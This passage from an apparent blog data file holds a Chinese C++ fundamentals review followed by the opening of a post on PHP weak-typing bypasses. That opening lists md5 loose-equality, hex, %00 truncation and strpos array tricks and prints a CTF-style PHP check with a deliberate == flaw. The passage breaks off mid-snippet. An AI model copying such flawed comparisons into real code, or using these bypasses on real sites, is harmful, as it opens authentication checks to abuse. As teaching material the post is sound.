class=\"line\">&#125;;</span><br><span class=\"line\">int main ( )</span><br><span class=\"line\">&#123;student *p;</span><br><span class=\"line\"> p&#x3D;new student;</span><br><span class=\"line\"> strcpy(p-&gt;name,&quot;Wang Fun&quot;);</span><br><span class=\"line\"> p-&gt;num&#x3D;10123;</span><br><span class=\"line\"> p-&gt;sex&#x3D;&#39;M&#39;;</span><br><span class=\"line\"> cout&lt;&lt;p-&gt;name&lt;&lt;&quot;  &quot;&lt;&lt;p-&gt;num&lt;&lt;&quot;  &quot;&lt;&lt;p-&gt;sex&lt;&lt;endl;</span><br><span class=\"line\"> delete p;</span><br><span class=\"line\"> return 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>先声明了一个结构体类型student，定义一个指向它的指针变量p，用new开辟一个空间存放一个student类型变量。<br>如果无法正常分配内存，运算会返回一个空指针NULL，程序可以设计判断结构，根据判断结果决定怎样操作。<br>注意不要混合使用new、delete、malloc、free。要正确搭配，不要用new分配内存后，又用free释放内存。</p>\n<p>明天继续复习！！！</p>\n","site":{"data":{}},"excerpt":"","more":"<p>﻿前言：慢慢复习路！！！</p>\n<p>目录：<br>0×01：函数的重载<br>0×02：函数的模板<br>0×03：有默认参数的函数<br>0×04：变量的引用<br>0×05：将引用作为函数参数<br>0×06：内置函数<br>0×07：作用域运算符<br>0×08：字符串变量<br>0×09：动态分配/撤销内存的运算符new和delete</p>\n<p><strong>0×01：函数的重载</strong><br>          定义：C++允许在同一个域中用一个函数名定义多个函数，这些函数的参数个数、参数类型不相同。用一个函数名实现不同的功能，就是函数的重载。</p>\n<p>例一：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">#include &lt;iostream&gt;</span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\">int max(int a,int b,int c)           &#x2F;&#x2F;求3个整数中的最大者</span><br><span class=\"line\">&#123; if (b&gt;a) a&#x3D;b;</span><br><span class=\"line\">if (c&gt;a) a&#x3D;c;</span><br><span class=\"line\">return a; </span><br><span class=\"line\">&#125; </span><br><span class=\"line\">float max(float a,float b, float c)  &#x2F;&#x2F;求3个实数中的最大者</span><br><span class=\"line\">&#123;if (b&gt;a) a&#x3D;b;</span><br><span class=\"line\"> if (c&gt;a) a&#x3D;c;</span><br><span class=\"line\"> return a; </span><br><span class=\"line\">&#125; </span><br><span class=\"line\">long max(long a,long b,long c)  &#x2F;&#x2F;求3个长整数中的最大者</span><br><span class=\"line\">&#123;if (b&gt;a) a&#x3D;b;</span><br><span class=\"line\"> if (c&gt;a) a&#x3D;c;</span><br><span class=\"line\"> return a;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>例二：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int main( )</span><br><span class=\"line\">&#123;int a,b,c;  float d,e,f;  long g,h,i;</span><br><span class=\"line\">cin&gt;&gt;a&gt;&gt;b&gt;&gt;c; </span><br><span class=\"line\">cin&gt;&gt;d&gt;&gt;e&gt;&gt;f;</span><br><span class=\"line\">cin&gt;&gt;g&gt;&gt;h&gt;&gt;i;</span><br><span class=\"line\">int m;</span><br><span class=\"line\">m&#x3D; max(a,b,c);                        &#x2F;&#x2F;函数值为整型</span><br><span class=\"line\">cout &lt;&lt;&quot;max_i&#x3D;&quot;&lt;&lt;m&lt;&lt;endl;</span><br><span class=\"line\">float n;</span><br><span class=\"line\">n&#x3D;max(d,e,f);                          &#x2F;&#x2F;函数值为实型</span><br><span class=\"line\">cout&lt;&lt;&quot;max_f&#x3D;&quot;&lt;&lt;n&lt;&lt;endl;</span><br><span class=\"line\">long int p;</span><br><span class=\"line\">p&#x3D;max(g,h,i);                          &#x2F;&#x2F;函数值为长整型</span><br><span class=\"line\">cout&lt;&lt;&quot;max_l&#x3D;&quot;&lt;&lt;p&lt;&lt;endl;</span><br><span class=\"line\">return 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>例三：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">下面的例子说明用函数重载设计参数个数不同的函数，用一个函数名求两个整数或三个整数中的最大数。</span><br><span class=\"line\">#include &lt;iostream&gt;</span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\"></span><br><span class=\"line\">int max(int a,int b,int c)     &#x2F;&#x2F;求3个整数中的最大者</span><br><span class=\"line\">&#123;if (b&gt;a) a&#x3D;b;</span><br><span class=\"line\"> if (c&gt;a) a&#x3D;c;</span><br><span class=\"line\"> return a;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>注意：<code>不允许函数参数个数、参数类型都相同，只是函数返回值不同。因为系统无法从调用形式上判断调用与哪个函数相匹配。</code></p>\n<p><strong>0×02：函数的模板</strong></p>\n<p>定义：如果两个函数的参数个数相同，函数的行为相同（做同样的事），只是函数和参数的数据类型不同，如果用函数重载的话，编写的函数代码是相同的，为了节省时间，C++提供了函数模板功能。(C++比C语言方便多了，小声bb)</p>\n<p>格式：<br>    template typename 标识符[, typename 标识符, … … ]<br>    函数定义（函数的类型和参数的类型用声明的标识符表示）<br>template    是关键字，含义是模板<br>    typename  是关键字，表示其后的标识符代表类型参数，调用时根据实参的类型确定形参的类型。<br>    所谓函数模板，是建立一个通用函数，不指定函数类型和参数类型，而用一个虚拟的类型表示。在调用函数时，用实参的类型取代模板中的虚拟类型。</p>\n<p>例1  为计算两个数中的大数定义函数模板</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &lt;iostream&gt;</span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\">template &lt;typename T&gt;</span><br><span class=\"line\">T max(T a,T b,T c)  &#x2F;&#x2F;用虚拟类型T表示类型</span><br><span class=\"line\">&#123;if(b&gt;a) a&#x3D;b;</span><br><span class=\"line\"> if(c&gt;a) a&#x3D;c;</span><br><span class=\"line\"> return a;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123;int i1&#x3D;8,i2&#x3D;5,i3&#x3D;6,i;</span><br><span class=\"line\"> double d1&#x3D;56.9,d2&#x3D;90.765,d3&#x3D;43.1,d;</span><br><span class=\"line\"> long g1&#x3D;67843,g2&#x3D;-456,g3&#x3D;78123,g;</span><br><span class=\"line\"> i&#x3D;max(i1,i2,i3);</span><br><span class=\"line\"> d&#x3D;max(d1,d2,d3);</span><br><span class=\"line\"> g&#x3D;max(g1,g2,g3);</span><br><span class=\"line\"> cout&lt;&lt;&quot;i_max&#x3D;&quot;&lt;&lt;i&lt;&lt;endl;</span><br><span class=\"line\"> cout&lt;&lt;&quot;d_max&#x3D;&quot;&lt;&lt;d&lt;&lt;endl;</span><br><span class=\"line\">cout&lt;&lt;&quot;g_max&#x3D;&quot;&lt;&lt;g&lt;&lt;endl;</span><br><span class=\"line\"> return 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>注意：<code>从程序中看到，此问题用函数模板比用函数重载更方便。注意，函数模板只适用于函数参数的个数相同而类型不同，并且函数体相同的情况，如果函数的参数个数不同，则不能用函数模板。</code><br><strong>0×03：有默认参数的函数</strong></p>\n<p>C++允许为函数的参数设置默认值，这时调用函数时，如果没有实参，就以默认值作为实参值。<br>    格式：<br>    形参类型  形参变量名 = 常数<br>    功能：调用函数时，如果没有实参，就以常数作为该形参的值;如果有实参，仍以实参的值作为该形参的值。<br>    注意：<code>有默认值的形参必须放在形参表的右边，不允许无默认参数值和有默认参数值的形参交错排列。</code></p>\n<p>字面意思不好理解，例子奉上。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">编写计算圆柱体体积函数</span><br><span class=\"line\">\tfloat  volume ( float h, float r &#x3D; 12.5)</span><br><span class=\"line\"></span><br><span class=\"line\">\t调用可以采用以下任何一种形式：</span><br><span class=\"line\">\tvolume( 45.6);</span><br><span class=\"line\">\tvolume( 32.5, 10.5);</span><br><span class=\"line\">\t函数参数结合从左到右，用第一种方式调用时，只有一个实参，圆半径的值取默认值12.5，用第二种方式调用时，有两个实参，圆半径的值取实参的值10.5。</span><br></pre></td></tr></table></figure>\n<p>注意：<code>一、如果用函数原型声明，只要在函数原型声明中定义形参的默认值即可。\n二、一个函数名不能同时用于重载函数和带默认形参值的函数。当调用函数时，如少写一个参数，系统无法判断是利用重载函数还是利用带默认参数值的函数，出现二义性。</code></p>\n<p><strong>0×04：变量的引用</strong></p>\n<p>C++提供了为变量取别名的功能，这就是变量的引用。<br>格式： 类型   &amp;变量1 = 变量2<br>变量2是在此之前已经定义过的变量，且与变量1的类型相同。这里为变量2定义一个别名变量1，在程序里变量1和变量2 就是同一个变量。<br>注意：两个变量不能用同一个别名。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">例：int a &#x3D; 3 ,b &#x3D;4;</span><br><span class=\"line\">\t       int &amp;c &#x3D; a;  &#x2F;&#x2F;   c是a 的别名</span><br><span class=\"line\">\t       int &amp;c &#x3D; b;  &#x2F;&#x2F;   错误的用法</span><br><span class=\"line\">\t一个变量可以有多个别名</span><br><span class=\"line\">\t例：int a &#x3D; 3;</span><br><span class=\"line\">\t\t  int &amp; b&#x3D; a;</span><br><span class=\"line\">\t\t  int &amp; c&#x3D; b;</span><br><span class=\"line\">\t变量a 有两个别名b和c。</span><br></pre></td></tr></table></figure>\n<p>又来</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &lt;iostream&gt;</span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\">int main( )</span><br><span class=\"line\">&#123;int a&#x3D;10;</span><br><span class=\"line\"> int &amp;b&#x3D;a;    &#x2F;&#x2F;声明b是a的引用</span><br><span class=\"line\"> a&#x3D;a*a;       &#x2F;&#x2F;a的值变化了，b的值也应一起变化</span><br><span class=\"line\"> cout&lt;&lt;a&lt;&lt;&quot;  &quot;&lt;&lt;b&lt;&lt;endl;   </span><br><span class=\"line\"> b&#x3D;b&#x2F;5;        &#x2F;&#x2F;b的值变化了，a的值也应一起变化</span><br><span class=\"line\"> cout&lt;&lt;b&lt;&lt;&quot;  &quot;&lt;&lt;a&lt;&lt;endl;</span><br><span class=\"line\"> return 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>0×05：将引用作为函数参数</strong></p>\n<p>C++除了可以用普通变量、指针变量做形参外，还可以用引用变量做形参。<br>    （1）用普通变量做形参<br>    这时传递的是实参的值，在函数内形参与实参是两个不同的内存单元，对形参的修改不会影响实参的值。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">例：无法实现两个变量的值互换的程序</span><br><span class=\"line\">#include &lt;iostream&gt;</span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\">void swap(int a,int b)</span><br><span class=\"line\">&#123; int temp;</span><br><span class=\"line\"> temp&#x3D;a;</span><br><span class=\"line\"> a&#x3D;b;</span><br><span class=\"line\"> b&#x3D;temp;                &#x2F;&#x2F;  实现a和b的值互换</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">int main( )</span><br><span class=\"line\">&#123;int i&#x3D;3,j&#x3D;5;</span><br><span class=\"line\"> swap(i,j);</span><br><span class=\"line\"> cout&lt;&lt;i&lt;&lt;&quot;,&quot;&lt;&lt;j&lt;&lt;endl;   &#x2F;&#x2F;  i和j的值未互换</span><br><span class=\"line\"> return 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>（2）用指针变量做形参</p>\n<p>C语言还允许用指针变量做形参，这时传递的是实参变量的地址（指针），在函数内利用这个指针访问实参变量。<br>    例1.11用指针变量做形参，实现两个变量值的交换。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &lt;iostream&gt;</span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\">void swap(int *p1,int *p2)</span><br><span class=\"line\">&#123;int temp;</span><br><span class=\"line\"> temp&#x3D;*p1;</span><br><span class=\"line\"> *p1&#x3D; *p2;</span><br><span class=\"line\"> *p2&#x3D;temp;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">int main( )</span><br><span class=\"line\">&#123;int i&#x3D;3,j&#x3D;5;</span><br><span class=\"line\"> swap(&amp;i,&amp;j);</span><br><span class=\"line\"> cout&lt;&lt;i&lt;&lt;&quot;,&quot;&lt;&lt;j&lt;&lt;endl;</span><br><span class=\"line\"> return 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>3）用引用变量做形参</p>\n<p>用指针变量做形参，它将实参变量的地址传递给形参，在函数内用“*指针变量”的方式访问实参变量。我们知道引用变量是变量的别名，在调用函数时，用引用变量做的形参就成了实参变量的别名，在函数中用的形参名就是实参的别名，这样比用指针变量更直观、更方便。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">例：利用引用变量实现两个变量值的交换</span><br><span class=\"line\">#include &lt;iostream&gt;</span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\">void swap(int &amp;a,int &amp;b)</span><br><span class=\"line\">&#123;int temp;</span><br><span class=\"line\"> temp&#x3D;a;</span><br><span class=\"line\"> a&#x3D;b;</span><br><span class=\"line\"> b&#x3D;temp;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">int main( )</span><br><span class=\"line\">&#123;int i&#x3D;3,j&#x3D;5;</span><br><span class=\"line\"> swap(i,j);</span><br><span class=\"line\"> cout&lt;&lt;&quot;i&#x3D;&quot;&lt;&lt;i&lt;&lt;&quot;   &quot;&lt;&lt;&quot;j&#x3D;&quot;&lt;&lt;j&lt;&lt;endl;</span><br><span class=\"line\"> return 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><strong><em>对引用的进一步说明</em></strong><br>（1）引用变量都具有非void类型<br>（2）不能建立引用的数组<br>（3）可以建立常引用变量，不允许修改常引用变量的值<br>例： int i ;<br>        const  int &amp;a = i;<br>        a = 3;   //    错误的用法<br>        i  = 8;   //    i 不是常变量，可以修改<br>        （4）可以建立指针变量的引用变量<br>例：int i;<br>       int  *p = &amp; i;<br>       int * &amp;pt = p; // pt是p的别名变量，同时<br>                            // 也是指针变量</p>\n<p><strong>0×06：内置函数</strong></p>\n<p>C++ 提供了一种机制，在编译时，将所调用的函数的代码嵌入到调用函数代码中，在执行函数时省去了调用环节，提高了函数的执行速度。这种机制称为内置函数，有的书称内联函数。<br>    格式：<br>    inline 函数类型 函数名(形参表)<br>    {    函数体    }<br>      inline 是C++的关键字，在编译时，编译程序会把这个函数嵌入到调用函数的函数体中<br>    调用格式：   函数名（实参表）</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">例：计算三个整数中的大数</span><br><span class=\"line\">#include &lt;iostream&gt;</span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\">inline int max(int a,int b,int c)   &#x2F;&#x2F; 这是一个内置函数，</span><br><span class=\"line\">                                                 &#x2F;&#x2F; 求3个整数中的最大者</span><br><span class=\"line\">&#123;if (b&gt;a) a&#x3D;b;</span><br><span class=\"line\"> if (c&gt;a) a&#x3D;c;</span><br><span class=\"line\"> return a;</span><br><span class=\"line\">&#125; </span><br><span class=\"line\"></span><br><span class=\"line\">int main( )</span><br><span class=\"line\">&#123;int i&#x3D;7,j&#x3D;10,k&#x3D;25,m;</span><br><span class=\"line\"> m&#x3D;max(i,j,k);</span><br><span class=\"line\"> cout&lt;&lt;&quot;max&#x3D;&quot;&lt;&lt;m&lt;&lt;endl;</span><br><span class=\"line\"> return 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>由于在定义函数时指定它是内置函数，因此编译系统在遇到函数调用max( i,j,k ) 时就用max函数体的代码代替max( i,j,k ) ，同时用实参代替形参。调用语句m= max( i,j,k ) 就被置换成：<br>    {  a=i ; b = j ; c= k;<br>    if ( b&gt;a) a=b;<br>    if ( c&gt;a) a=c;<br>    m=a;<br>     }</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">例:用内置函数计算平方根</span><br><span class=\"line\">#include &lt;iostream&gt;</span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\">inline int power(int x)       &#x2F;&#x2F;定义内置函数</span><br><span class=\"line\">&#123;return x*x;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123;cout&lt;&lt;power(2)&lt;&lt;endl;</span><br><span class=\"line\"> cout&lt;&lt;power(1+1)&lt;&lt;endl;</span><br><span class=\"line\"> return 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>编译程序遇见内置函数power时，先求出函数的实参值（1+1=2），然后用power函数体代替函数调用，调用语句变成：<br>    {  cout&lt;&lt;2<em>2&lt;&lt;endl;<br>       cout&lt;&lt;2</em>2&lt;&lt;endl;<br>    }<br>    运行结果是<br>    4<br>    4 </p>\n<p>优缺点：<code>使用内置函数可以节省程序的运行时间，但增加了目标程序的长度。所以在使用时要衡量时间和空间的得失。</code></p>\n<p><strong>0×07：作用域运算符</strong><br>直接看例子：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">局部变量和全局变量同名</span><br><span class=\"line\">\t#include &lt;iostream&gt;</span><br><span class=\"line\">\tusing namespace std;</span><br><span class=\"line\">\tfloat a&#x3D;13.5;</span><br><span class=\"line\">\tint main( )</span><br><span class=\"line\">\t&#123;    int a&#x3D;5;</span><br><span class=\"line\">\t     cout&lt;&lt;a&lt;&lt;endl;</span><br><span class=\"line\">\t     return 0;    &#125;</span><br></pre></td></tr></table></figure>\n<p>程序中有两个变量a，一个是全局变量，另一个是main函数的局部变量，根据局部变量会屏蔽同名的全局变量规则，在函数中出现的变量a是局部变量，因此输出的值是5，而不是13.5，为了在函数中访问全局变量C++提供了作用域运算符 :: ，可以用来指定要访问的作用域，可以把main函数改写成</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &lt;iostream&gt;</span><br><span class=\"line\">\tusing namespace std;</span><br><span class=\"line\">\tfloat a&#x3D;13.5;</span><br><span class=\"line\">\tint main( )</span><br><span class=\"line\">\t&#123;int a&#x3D;5;</span><br><span class=\"line\">\tcout&lt;&lt;a&lt;&lt;endl;</span><br><span class=\"line\">\tcout&lt;&lt;::a&lt;&lt;endl;</span><br><span class=\"line\">\t return 0;</span><br><span class=\"line\">\t&#125;</span><br></pre></td></tr></table></figure>\n<p>::a表示全局变量a。注意不能用::访问局部变量。</p>\n<p><strong>0×08：字符串变量</strong></p>\n<p>C++提供了字符串类类型string，实际上它不是C++的基本类型，它是在C++标准库中声明的一个字符串类，程序可以用它定义对象。<br>    1.定义字符串变量<br>    格式：  string 变量名表;<br>    可以在定义变量时用字符串常量为变量赋初值：<br>            string   变量名 = 字符串常量<br>    <strong>注意</strong>：<code>如用字符串变量，在程序开始要用包含语句把C++标准库的string头文件包含进来。</code></p>\n<p>2.对字符串操作<br>① 对字符串变量赋值<br>     字符串变量= 字符串表达式<br>例： string  st1,st2;<br>        st1 = “王点点“;<br>        st2 = st1;</p>\n<p> ②  访问字符串中的字符<br>C++允许把字符串作为字符数组，第一个字符的下标是0，第二个字符的下标是1，以此类推。<br>例：string  w = “ then”;<br>       w[2] = ‘e’;<br>结果字符串w变成 than</p>\n<p>③输入输出字符串<br>格式：cin &gt;&gt; 字符串变量<br>           cout &lt;&lt; 字符串变量</p>\n<p>④字符串连接运算<br>格式：字符串1 + 字符串2<br>功能：把连接运算符两端的字符连接成一个字符串。表达式中可以用字符串常量也可以用字符串变量。<br>例：string  st1=“C++”;<br>       string  st2=“Language”;<br>       st1 = st1 + st2 ;<br>结果是 C++Language</p>\n<p>⑤字符串的比较运算<br>    可以用关系运算符&gt;、&gt;=、==、!=、&lt;、&lt;=对两个字符串同一位置的字符进行比较，根据ASCII码值判定字符的大小。<br>    例：”china” &gt; “chinese”<br>    运算结果是假。</p>\n<p><strong>0×09：动态分配/撤销内存的运算符new和delete</strong> </p>\n<p>分配内存运算<br>new  类型 [ （初值）]<br>类型是决定分配空间尺寸的关键元素，如果运算结果正确，它的值是分配内存空间的起始地址，否则返回NULL。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">例：int  *a &#x3D;new int ;</span><br><span class=\"line\"> \t  int  *b &#x3D;new int( 100);</span><br><span class=\"line\"> \t  char *ch &#x3D; new char[10];</span><br><span class=\"line\"> \t  int * q &#x3D; new int [5][4];</span><br><span class=\"line\">  \t  float  * p &#x3D; new float(3.14159);</span><br></pre></td></tr></table></figure>\n<p>归还动态内存运算<br>delete[] 指针变量<br>[] 代表数组，如果不是数组可以省略[]。<br>运算功能：撤销指针变量所指的动态内存空间，指针变量的数据类型决定了空间尺寸的大小。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">例：char *p&#x3D;new char[10];</span><br><span class=\"line\">        … …</span><br><span class=\"line\"> \t delete [ ] p;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">例1.18用动态内存存放结构体变量</span><br><span class=\"line\">#include &lt;iostream&gt;</span><br><span class=\"line\">#include &lt;string.h&gt;</span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\">struct student </span><br><span class=\"line\">&#123;char name [10];</span><br><span class=\"line\"> int num;</span><br><span class=\"line\"> char sex;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">int main ( )</span><br><span class=\"line\">&#123;student *p;</span><br><span class=\"line\"> p&#x3D;new student;</span><br><span class=\"line\"> strcpy(p-&gt;name,&quot;Wang Fun&quot;);</span><br><span class=\"line\"> p-&gt;num&#x3D;10123;</span><br><span class=\"line\"> p-&gt;sex&#x3D;&#39;M&#39;;</span><br><span class=\"line\"> cout&lt;&lt;p-&gt;name&lt;&lt;&quot;  &quot;&lt;&lt;p-&gt;num&lt;&lt;&quot;  &quot;&lt;&lt;p-&gt;sex&lt;&lt;endl;</span><br><span class=\"line\"> delete p;</span><br><span class=\"line\"> return 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>先声明了一个结构体类型student，定义一个指向它的指针变量p，用new开辟一个空间存放一个student类型变量。<br>如果无法正常分配内存，运算会返回一个空指针NULL，程序可以设计判断结构，根据判断结果决定怎样操作。<br>注意不要混合使用new、delete、malloc、free。要正确搭配，不要用new分配内存后，又用free释放内存。</p>\n<p>明天继续复习！！！</p>\n"},{"title":"PHP弱类型及绕过方式（二）","date":"2020-05-04T07:04:05.000Z","photos":["https://cdn.jsdelivr.net/gh/yremp/cdn@2.1.5/img/cover/(4).jpg.webp"],"_content":"\n\n\n继续！！！\n\n目录：\n         0×01.md5加密相等绕过\n         0×02.十六进制与数字比较\n         0×03.ereg正则%00截断\n         0×04.strpos数组绕过\n\n\n  **0×01.md5加密相等绕过**\n\n```\n<?php\n$md51 = md5('QNKCDZO');\n$a = @$_GET['a'];\n$md52 = @md5($a);\nif(isset($a)){\nif ($a != 'QNKCDZO' && $md51 == $md52) {\necho \"flag{*}\";\n} else {\necho \"false!!!\";\n}}\nelse{echo \"please input 